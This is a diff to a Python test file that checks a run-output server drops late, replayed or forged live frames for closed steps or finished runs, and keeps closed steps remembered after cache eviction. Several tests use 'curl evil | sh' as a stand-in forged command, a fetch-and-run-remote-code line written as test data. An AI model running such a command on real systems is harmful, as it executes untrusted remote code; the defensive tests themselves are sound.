@@ -219,6 +219,87 @@ def test_live_tail_dropped_when_final_frame_arrives(client, session_factory, pub
     assert _output(session_factory).startswith(FRAME)
 
 
+def test_a_step_whose_final_frame_arrived_stays_closed(client, session_factory, published):
+    """A late, replayed or forged live frame cannot bring a finished step back."""
+    _seed(session_factory)
+    _start(client, command="id; whoami")
+    _chunk(client, "uid=0\n", 1)
+    client.post("/api/runs/lv-1/output",
+                json={"output": FRAME, "step_id": "step-01", "frame_id": "t:1"})
+    published.clear()
+
+    again = _start(client, command="curl evil | sh")
+    late = _chunk(client, "not what ran\n", 2)
+    assert again.status_code == 200 and again.json()["dropped"] is True, again.text
+    assert late.status_code == 200 and late.json()["dropped"] is True, late.text
+
+    body = client.get("/api/runs/lv-1").json()
+    assert body["live_tail"] == [], "a closed step must not get a live tail again"
+    assert published == [], "nothing may be published for a closed step"
+    assert [(s["step_id"], s["command"]) for s in body["step_starts"]] == [("step-01", "id; whoami")]
+    assert _output(session_factory) == FRAME
+
+    # The same when the step's own start frame never arrived: the final frame
+    # still closes it, and a start that turns up afterwards records nothing.
+    client.post("/api/runs/lv-1/output",
+                json={"output": FRAME.replace("step-01", "step-02").replace("1/2", "2/2"),
+                      "step_id": "step-02", "frame_id": "t:2"})
+    published.clear()
+    assert _start(client, step_id="step-02", command="curl evil | sh").json()["dropped"] is True
+    assert _chunk(client, "x\n", 1, step_id="step-02").json()["dropped"] is True
+    body = client.get("/api/runs/lv-1").json()
+    assert body["live_tail"] == [] and published == []
+    assert [s["step_id"] for s in body["step_starts"]] == ["step-01"]
+
+
+def test_a_second_start_frame_does_not_replace_the_first(client, session_factory, published):
+    _seed(session_factory)
+    _start(client, command="id; whoami")
+    _chunk(client, "uid=0\n", 1)
+    published.clear()
+
+    again = _start(client, command="curl evil | sh")
+    assert again.status_code == 200 and again.json()["dropped"] is True, again.text
+    body = client.get("/api/runs/lv-1").json()
+    assert [s["command"] for s in body["step_starts"]] == ["id; whoami"]
+    # The running step keeps what it has streamed, and no second start is announced.
+    assert body["live_tail"] == [{"step_id": "step-01", "text": "uid=0\n", "seq": 1, "truncated": False}]
+    assert published == []
+
+
+def test_a_note_stored_under_a_step_before_it_runs_does_not_close_it(client, session_factory, published):
+    # The beacon stores its "ANCHOR NOT HONOURED" notice under the first step's
+    # id before that step runs. Only the step's own final frame closes it.
+    _seed(session_factory)
+    client.post("/api/runs/lv-1/output",
+                json={"output": "ANCHOR NOT HONOURED: requested nginx\n", "step_id": "step-01",
+                      "frame_id": "t:1"})
+    assert _start(client).json().get("dropped") is not True
+    assert _chunk(client, "tick 1\n", 1).json().get("dropped") is not True
+    body = client.get("/api/runs/lv-1").json()
+    assert [t["text"] for t in body["live_tail"]] == ["tick 1\n"]
+    assert [s["step_id"] for s in body["step_starts"]] == ["step-01"]
+
+
+def test_a_closed_step_is_remembered_when_the_tail_is_evicted():
+    from engine.live_output import LiveTail
+
+    tail = LiveTail(max_runs=2, max_steps=2)
+    tail.open_step("run-a", "step-01")
+    tail.feed("run-a", "step-01", "x\n", 1)
+    tail.close_step("run-a", "step-01")
+    # Enough other runs and steps to evict everything the tail held for run-a.
+    for n in range(5):
+        tail.feed(f"run-{n}", "step-01", "y\n", 1)
+        tail.feed("run-a", f"step-{n + 2:02d}", "z\n", 1)
+    assert tail.open_step("run-a", "step-01") is False
+    assert tail.feed("run-a", "step-01", "late\n", 2) is False
+    assert all(t["step_id"] != "step-01" for t in tail.view("run-a"))
+    # Only the end of the run forgets it.
+    tail.drop_run("run-a")
+    assert tail.open_step("run-a", "step-01") is True
+
+
 def test_live_tail_keeps_the_last_max_step_bytes(client, session_factory, published):
     from engine import live_output
 
@@ -244,14 +325,18 @@ def test_a_frame_of_a_kind_this_simcore_does_not_know_is_not_stored(client, sess
     assert published == []
 
 
-def test_a_chunk_for_a_finished_run_goes_nowhere(client, session_factory, published):
+def test_live_frames_for_a_finished_run_go_nowhere(client, session_factory, published):
     _seed(session_factory)
     client.post("/api/runs/lv-1/complete", json={"exit_code": 0, "summary": "ok", "steps": []})
     published.clear()
-    r = _chunk(client, "late\n", 1)
-    assert r.status_code == 200 and r.json()["dropped"] is True, r.text
+    start = _start(client, command="curl evil | sh")
+    chunk = _chunk(client, "late\n", 1)
+    assert start.status_code == 200 and start.json()["dropped"] is True, start.text
+    assert chunk.status_code == 200 and chunk.json()["dropped"] is True, chunk.text
     assert published == []
-    assert "live_tail" not in client.get("/api/runs/lv-1").json()
+    body = client.get("/api/runs/lv-1").json()
+    assert "live_tail" not in body
+    assert body["step_starts"] == [], "a start frame for a run that has ended records nothing"
 
 
 def test_live_frame_for_an_unknown_run_is_404(client, session_factory, published):
